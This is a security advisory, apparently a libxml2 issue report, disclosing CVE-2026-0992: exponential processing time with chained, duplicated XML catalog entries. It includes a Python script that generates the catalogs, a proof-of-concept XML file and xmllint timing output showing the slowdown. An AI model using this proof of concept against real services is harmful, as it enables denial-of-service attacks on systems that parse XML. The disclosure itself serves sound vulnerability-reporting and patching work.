(CVE-2026-0992) Exponential behavior when handling 

Consider a chain of XML catalogs linked with <nextCatalog> and having the <nextCatalog> element repeated. For instance catalog0.xml:

<catalog xmlns="urn:oasis:names:tc:entity:xmlns:xml:catalog">
  <nextCatalog catalog="catalog1.xml"/>
  <nextCatalog catalog="catalog1.xml"/>
</catalog>

catalog1.xml:

<catalog xmlns="urn:oasis:names:tc:entity:xmlns:xml:catalog">
  <nextCatalog catalog="catalog2.xml"/>
  <nextCatalog catalog="catalog2.xml"/>
</catalog>

And so on... Here's a Python script that generates such catalogs:

import sys

max_depth = int(sys.argv[1])
fan_out = 10 

for i in range(max_depth):
    with open(f'catalog{i}.xml', 'w') as file:
        file.write('<catalog xmlns="urn:oasis:names:tc:entity:xmlns:xml:catalog">\n')
        if i + 1 < max_depth:
            for j in range(fan_out):
                file.write(f'  <nextCatalog catalog="catalog{i+1}.xml"/>\n')
        file.write('</catalog>\n')

Then processing these catalogs will take exponential time which could eventually lead to denial of service. For instance with input file poc.xml

<!DOCTYPE doc [ <!ENTITY e SYSTEM "foo.ent"> ]>
<doc>&e;</doc>

you'll see:

% python3 generate_catalogs.py 7
% XML_CATALOG_FILES=catalog0.xml /usr/bin/time xmllint --noout --noent poc.xml           
warning: failed to load external entity "foo.ent"
        0.11 real         0.11 user         0.00 sys
% python3 generate_catalogs.py 8
% XML_CATALOG_FILES=catalog0.xml /usr/bin/time xmllint --noout --noent poc.xml
warning: failed to load external entity "foo.ent"
        0.76 real         0.75 user         0.00 sys
% python3 generate_catalogs.py 9
% XML_CATALOG_FILES=catalog0.xml /usr/bin/time xmllint --noout --noent poc.xml
warning: failed to load external entity "foo.ent"
        8.22 real         8.20 user         0.01 sys

This can also be triggered with a "local" catalog and the <?oasis-xml-catalog?> processing instruction, see #1018 (closed).

Additional remarks

This report is subject to a 90-day disclosure deadline. Please attribute the discovery to Nick Wellnhofer.
